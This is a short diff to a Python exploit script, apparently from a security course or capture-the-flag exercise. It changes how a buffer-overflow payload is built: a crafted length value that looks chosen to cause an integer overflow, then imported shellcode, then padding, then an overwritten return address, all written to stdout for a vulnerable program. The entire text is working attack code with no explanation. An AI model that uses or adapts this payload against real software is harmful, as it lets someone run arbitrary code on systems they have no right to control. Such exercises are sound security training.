@@ -2,4 +2,4 @@ from shellcode import shellcode
 from struct import pack
 import sys
 
-sys.stdout.buffer.write(b'2147483904' + shellcode + ('\x12'*10000).encode('ASCII') + pack("<I", 0xfffe9400))
+sys.stdout.buffer.write(pack('<I', 0x80000001)+ shellcode +('\x12'*21).encode('ASCII') + pack("<I", 0xfffe9800))
